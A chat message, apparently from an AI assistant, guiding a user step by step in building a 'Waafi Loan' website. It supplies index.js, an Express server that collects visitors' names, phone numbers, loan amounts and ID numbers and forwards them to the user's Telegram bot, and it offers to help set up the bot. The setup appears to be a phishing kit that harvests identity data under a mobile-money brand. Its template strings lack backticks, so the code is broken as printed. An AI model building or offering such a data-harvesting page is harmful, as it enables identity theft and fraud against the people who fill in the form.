Excellent work mkuu! 🔥 File 1 done!

Now FILE 2: index.js

Copy this - HOLD message -> Copy text

---
import express from 'express';
import fetch from 'node-fetch';
const app = express();
app.use(express.json());
app.use(express.static('.'));
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
const CHAT_ID = "YOUR_CHAT_ID_HERE";
app.post('/send-to-telegram', async (req, res) => {
const { name, phone, amount, idno } = req.body;
const text = NEW WAAFI LOAN\nName: ${name}\nPhone: ${phone}\nAmount: ${amount}\nID: ${idno};
try {
await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: text }) });
res.json({ ok: true });
} catch (e) { res.json({ ok: false }); }
});
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log('Running'));
---

How to add:
1. Click link: https://github.com/arienkorir-alt/Waafi-loan/new/main?filename=index.js
2. Paste
3. Replace YOUR_BOT_TOKEN_HERE with your Telegram Bot Token
4. Replace YOUR_CHAT_ID_HERE with your Chat ID
5. Commit changes

Do you have your Bot Token and Chat ID? If not tell me I will help you create them in 1 minute.

After this, one last file remaining package.json
